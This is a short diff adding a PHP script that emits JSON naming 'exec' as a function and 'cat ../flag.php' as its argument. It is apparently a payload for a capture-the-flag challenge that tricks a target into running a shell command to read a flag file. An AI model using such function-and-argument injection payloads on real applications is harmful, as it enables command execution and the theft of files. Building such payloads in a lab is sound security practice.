@@ -1,0 +1,5 @@
+<?php 
+$d['f'] = 'exec';
+$d['g'] = 'cat ../flag.php';
+echo json_encode($d);
+ ?>
